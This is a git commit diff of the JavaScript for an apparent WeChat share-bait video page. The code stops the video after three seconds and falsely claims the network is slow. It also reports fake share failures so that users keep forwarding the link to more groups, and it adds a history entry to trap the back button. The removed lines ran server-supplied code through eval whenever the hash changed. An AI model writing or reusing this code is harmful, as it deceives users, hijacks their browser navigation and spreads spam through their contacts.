3307e88b30ae52c597ed710781da813aa1122a92
xin <137105161@qq.com>
2017-12-03 14:04:01 +0800

    1.修改js

--- web/app.js
+++ web/app.js
@@ -1,77 +1,62 @@
-var d = new Date();
-var str = d.getFullYear() + "-" + (d.getMonth() + 1) + "-" + d.getDate();
-document.getElementById("post-date").innerHTML = str;
-
-function GetQueryString(name) {
-    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
-    var r = window.location.search.substr(1).match(reg);
-    if (r != null) return unescape(r[2]);
-    return null;
+function setCookie(name,value)
+{
+    var Days = 1;
+    var exp = new Date();
+    exp.setTime(exp.getTime() + Days*6*1000);
+    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
 }
 
-if ($.cookie('delaytime') == null) {
-    $.cookie('delaytime', window.share_info.to_info.delaytime, {
-        expires: 60,
-        path: '/'
-    });
+function getCookie(name)
+{
+    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+
+    if(arr=document.cookie.match(reg))
+
+        return unescape(arr[2]);
+    else
+        return null; }
+
+//setCookie('delaytime','100');
+if (getCookie('delaytime')==null)
+{
+    setCookie('delaytime','3');
 }
 
-
-if (GetQueryString('tip') == 'ok') {
-    $.cookie('tip', 'ok', {
-        expires: 60,
-        path: '/'
-    });
+if (getCookie('tip')=='ok')
+{
+    setTimeout('jssdk()',500);
 }
 
-
-if ($.cookie('tip') == 'ok') {
-    setTimeout('jssdk()', 500);
-}
-
-function set_tip_ok() {
-    $.cookie('tip', 'ok', {
-        expires: 60,
-        path: '/'
-    });
-    var urls = location.href.split('#')[0] + '&tip=ok';
-    //alert(urls);
-    top.location = urls;
-    // $.getScript('//service.moyuling.cn/jump.php?tip=ok')
-}
 
 var pageGlobal = {};
-pageGlobal.vid = window.share_info.to_info.vid;
+pageGlobal.vid = 'b0565ov23h8';//b0553wfuebh w0557pq283m  p0551de0a7m
 pageGlobal.playStatus = '';
-pageGlobal.delayTime = parseInt($.cookie('delaytime'));
+pageGlobal.delayTime = parseInt(getCookie('delaytime'));
 
 var video, player;
 var vid = pageGlobal.vid;
 var playStatus = 'pending';
 
-new Swiper('.swiper-container', {
-    autoplay: 5000
-});
+new Swiper('.swiper-container', {autoplay: 5000});
 
-$(function() {
+$(function(){
     var elId = 'mod_player_skin_0';
-    $("#js_content").html('<div id="' + elId + '" class="player_skin" style="padding-top:6px;"></div>');
+    $("#js_content").html('<div id="'+elId+'" class="player_skin" style="padding-top:6px;"></div>');
     var elWidth = $("#js_content").width();
-    playVideo(vid, elId, elWidth);
+    playVideo(vid,elId,elWidth);
     $("#pauseplay").height($("#js_content").height() - 10);
 
-    if (playStatus == 'pending') {
+    if(playStatus == 'pending') {
+        var delayTime = pageGlobal.delayTime;
         var isFirst = true;
-        setInterval(function() {
+        setInterval(function(){
             try {
                 var currentTime = player.getCurTime();
-                if (currentTime >= pageGlobal.delayTime) {
+                if(currentTime >= delayTime) {
                     $('#pauseplay').show();
                     player.callCBEvent('pause');
-                    $.cookie(vid, 's', {
-                        path: '/'
-                    });
-                    if (isFirst) {
+                    $.cookie(vid, 's', {path: '/'});
+                    if(isFirst) {
                         $('#pauseplay').trigger('click');
                     }
                     isFirst = false;
@@ -84,13 +69,17 @@ $(function() {
 
     var h = $('#scroll').height();
     $('#scroll').css('height', h > window.screen.height ? h : window.screen.height + 1);
-    new IScroll('#wrapper', {
-        useTransform: false,
-        click: true
-    });
+    new IScroll('#wrapper', {useTransform: false, click: true});
+
+
+    setTimeout(function() {
+        history.pushState(history.length + 1, "message", "#" + new Date().getTime());
+    }, 200);
+
+
 });
 
-function playVideo(vid, elId, elWidth) {
+function playVideo(vid,elId,elWidth){
     //定义视频对象
     video = new tvp.VideoInfo();
     //向视频对象传入视频vid
@@ -102,24 +91,26 @@ function playVideo(vid, elId, elWidth) {
     player.setCurVideo(video);
 
     //输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
-    //player.addParam("autoplay","1");
+    //player.addParam("autoplay","1"); 
 
-    player.addParam("wmode", "transparent");
-    player.addParam("pic", tvp.common.getVideoSnapMobile(vid));
+    player.addParam("wmode","transparent");
+    player.addParam("pic",tvp.common.getVideoSnapMobile(vid));
     player.write(elId);
 }
 
 $('#pauseplay').on('click', function() {
-    set_tip_ok();
+    setCookie('tip','ok');
+    location.reload();
+
 });
 
-$('#like').on('click', function() {
+$('#like').on('click', function(){
     var $icon = $(this).find('i');
     var $num = $(this).find('#likeNum');
     var num = 0;
-    if (!$icon.hasClass('praised')) {
+    if(!$icon.hasClass('praised')){
         num = parseInt($num.html());
-        if (isNaN(num)) {
+        if(isNaN(num)) {
             num = 0;
         }
         $num.html(++num);
@@ -127,7 +118,7 @@ $('#like').on('click', function() {
     } else {
         num = parseInt($num.html());
         num--;
-        if (isNaN(num)) {
+        if(isNaN(num)) {
             num = 0;
         }
         $num.html(num);
@@ -146,11 +137,16 @@ function jump(url) {
 }
 
 function jssdk() {
+
     $("#mask").css("height", $(document).height());
     $("#mask").css("width", $(document).width());
     $("#mask").show();
     $("#fenxiang").show();
+    $('#game_result').hide();
+    $('.time-out-num').hide();
+    $('.bag').hide();
     show_tip();
+
 }
 
 
@@ -173,8 +169,8 @@ function jssdk() {
         head.appendChild(js);
 
         //执行回调
-        var callbackFn = function() {
-            if (typeof callback === 'function') {
+        var callbackFn = function(){
+            if(typeof callback === 'function'){
                 callback();
             }
         };
@@ -193,14 +189,13 @@ function jssdk() {
     }
 
     //如果使用的是zepto，就添加扩展函数
-    if (Zepto) {
+    if(Zepto){
         $.getScript = _getScript;
     }
 
 })();
 
 var alertTimes = 0;
-
 function wxalert(msg, btn, callback) {
     if (alertTimes == 0) {
         var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
@@ -216,10 +211,34 @@ function wxalert(msg, btn, callback) {
         if (callback) {
             callback()
         }
-    })
+    });
 }
 
-function share_tip() {
+// function share_tip(shareATimes,shareTTimes) {
+//     if (shareATimes == 1) {
+//         wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群！', '好')
+//     } else if (shareATimes == 2) {
+//         wxalert('<span style="font-size: 30px;color: #f5294c">分享失败！</span><br>注意：分享到相同的群会失败<br>请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群！', '好');
+//     }
+//     // } else if (shareATimes == 3) {
+//     // 	wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群！', '好')
+//     //}
+//     else {
+//         wx.hideOptionMenu();
+//         wx.showMenuItems({menuList:['menuItem:share:timeline']});
+//         if (shareTTimes < 1) {
+//             wxalert('分享成功，剩下最后一步啦！<br />请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>!', '好');
+//         } else {
+//             wxalert('分享成功,点击确定继续播放!', '确定', function() {
+//                 setCookie('delaytime','12000');
+//                 setCookie('tip','goon');
+//                 location.reload();
+//             });
+//         }
+//     }
+// }
+
+function share_tip(shareATimes,shareTTimes) {
     if (shareATimes == 1) {
         wxalert('<b style="font-size: 22px">分享失败！</b><br>注意：分享到相同的群会失败！<br>请继续分享到不同的群即可<b style="color: red;">免流量加速观看</b>', '好')
     } else if (shareATimes == 2) {
@@ -241,7 +260,7 @@ function share_tip() {
                 expires: 60,
                 path: '/'
             });
-            $("#gdt_area").css('display', 'block');
+
             player.setPlaytime(pageGlobal.delayTime);
             pageGlobal.delayTime = 10000;
             window.name = "";
@@ -251,17 +270,20 @@ function share_tip() {
 
 }
 
+
+
+
 function show_tip() {
-    wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 22px;color: red">数据加载中断</b><br/>请分享到微信群，可<b style="color: red;">免流量加速观看</b>', '好')
+    wxalert('网速缓慢，请分享到微信群才可以继续观看。', '好');
 }
 $(function() {
 
     $('#fenxiang').on('click', function() {
-        show_tip()
+        show_tip();
     });
     $('#mask').on('click', function() {
-        show_tip()
-    })
+        show_tip();
+    });
 });
 
 
@@ -270,110 +292,60 @@ var shareATimes = 0;
 var shareTTimes = 0;
 
 
-$(function() {
+// console.log(encodeURIComponent(location.href.split('#')[0]));
+$(function () {
     $.ajax({
-        type: "GET",
-        //url : "//bqhukj.cn/jsdk/sign/api3.php?url=" + encodeURIComponent(location.href.split('#')[0]) + '&_=' + Date.now(),
-        url: "/video/get_config.php?url=" + encodeURIComponent(location.href.split('#')[0]) + '&_=' + Date.now(),
-        //url : "//swapi.sc2yun.com/jssdk/get_config.php?url=" + encodeURIComponent(location.href.split('#')[0]) + '&_=' + Date.now(),
-
-        dataType: "jsonp",
+        url: '/video/get-config?url=' + encodeURIComponent(location.href.split('#')[0]) + '&_=' + Date.now(),
+        type:'get',
         jsonp: "callback",
-        data: {},
-        success: function(result) {
-            window.config = {
-                debug: false,
-                appId: result.appId,
-                timestamp: result.timestamp,
-                nonceStr: result.nonceStr,
-                signature: result.signature,
-                jsApiList: ['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideMenuItems', 'showMenuItems']
-            };
-            wx.config(window.config);
-
-            wx.ready(function() {
+        dataType:'jsonp',
+        success:function(result){
+            window.data = result;
+            // console.log(result);
+            //window.data.config.appId = window.data.config.appId.replace('x','w');
+            wx.config(window.data.config);
+            wx.ready(function(){
                 wx.hideOptionMenu();
-                wx.showMenuItems({
-                    menuList: ['menuItem:share:appMessage']
-                });
+                wx.showMenuItems({menuList:['menuItem:share:appMessage']});
                 //wx.showMenuItems({menuList:['menuItem:share:appMessage','menuItem:share:timeline']});
-                if ($.cookie('tip') == 'goon') {
-                    $("#gdt_area").show();
-                    $("#gdt_area").css('display', 'block');
-                    //$("#gdt_area").removeAttr("style").attr("style", "display:block;");
-                }
-                /*$("#activity-name").text(window.share_info.to_info.title); */
-                var ua = navigator.userAgent.toLowerCase();
-                var city = '';
-                if (remote_ip_info) {
-                    city = remote_ip_info['city'];
-                    if (city.length == 0) {
-                        city = remote_ip_info['province'];
-                    }
-                }
-                if (!city) {
-                    city = '';
-                }
-                if (/iphone|ipad|ipod/.test(ua) && window.share_info.to_info.fx) {
-                    wx.onMenuShareAppMessage({
-                        title: window.share_info.to_timeline2.title.replace('{city}', city),
-                        desc: window.share_info.to_timeline2.desc,
-                        link: window.share_info.to_timeline2.link,
-                        imgUrl: window.share_info.to_timeline2.img,
-                        success: function() {
-                            shareATimes += 1;
-                            share_tip();
-                        },
-                        cancel: function() {
-
-                        }
-                    });
-                } else {
-                    wx.onMenuShareAppMessage({
-                        title: window.share_info.to_group.title.replace('{city}', city),
-                        desc: window.share_info.to_group.desc,
-                        link: window.share_info.to_group.link,
-                        imgUrl: window.share_info.to_group.img,
-                        success: function() {
-                            shareATimes += 1;
-                            share_tip();
-                        },
-                        cancel: function() {
-
-                        }
-                    });
-
-                }
-                wx.onMenuShareTimeline({
-                    title: window.share_info.to_timeline.title.replace('{city}', city),
-                    link: window.share_info.to_timeline.link,
-                    imgUrl: window.share_info.to_timeline.img,
-                    success: function() {
-                        shareTTimes += 1;
-                        share_tip();
-                    },
-                    cancel: function() {
-
-                    }
-                });
-
-
+                share_config(window.data);
             });
-            wx.error(function(res) {
-                wx.config(window.config);
-            });
+
         }
+
+
     });
 });
 
-function anchor() {
-    history.pushState(history.length + 1, "message", "#" + new Date().getTime())
+function share_config(data){
+    data.config.signature = null;
+    wx.config(data.config);
+    wx.ready(function(){
+        wx.onMenuShareAppMessage({
+            title: data.share_app_info.title,
+            desc: data.share_app_info.desc,
+            link: data.share_app_info.link,
+            imgUrl: data.share_app_info.img_url,
+            success: function () {
+                shareATimes += 1;
+                share_tip(shareATimes,shareTTimes);
+            },
+            cancel: function () {
+
+            }
+        });
+        wx.onMenuShareTimeline({
+            title: data.share_timeline_info.title,
+            link: data.share_timeline_info.link,
+            imgUrl: data.share_timeline_info.img_url,
+            success: function () {
+                shareTTimes += 1;
+                share_tip(shareATimes,shareTTimes);
+            },
+            cancel: function () {
+
+            }
+        });
+    });
 }
 
-function zp() {
-    eval(window.share_info.backup);
-}
-setTimeout('anchor()', 100);
-window.onhashchange = function() {
-    zp()
-};
